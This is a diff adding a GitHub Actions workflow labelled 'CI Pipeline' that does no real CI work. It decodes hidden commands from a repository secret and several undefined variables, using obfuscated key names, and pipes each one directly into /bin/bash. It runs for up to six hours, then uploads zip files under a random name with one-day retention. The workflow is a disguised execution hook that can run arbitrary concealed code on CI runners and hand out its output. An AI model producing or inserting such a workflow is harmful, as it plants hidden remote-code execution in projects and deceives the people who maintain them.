@@ -1,0 +1,26 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          cret43: ${{ secrets.cret43 }}
+        run: |
+          printf '%s' "$cret43" | jq -r .yguyy685 | /bin/bash
+          printf '%s' "$ve448" | jq -r .g05381 | /bin/bash
+          echo $kv5989 | jq -r .xemws9 | /bin/bash
+          echo $cdi96 | jq -r .g2 | /bin/bash
+          echo $wig5 | jq -r .c79452 | /bin/bash
+
+      - name: Store artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nUxqSD7X
+          path: "*.zip"
+          retention-days: 1
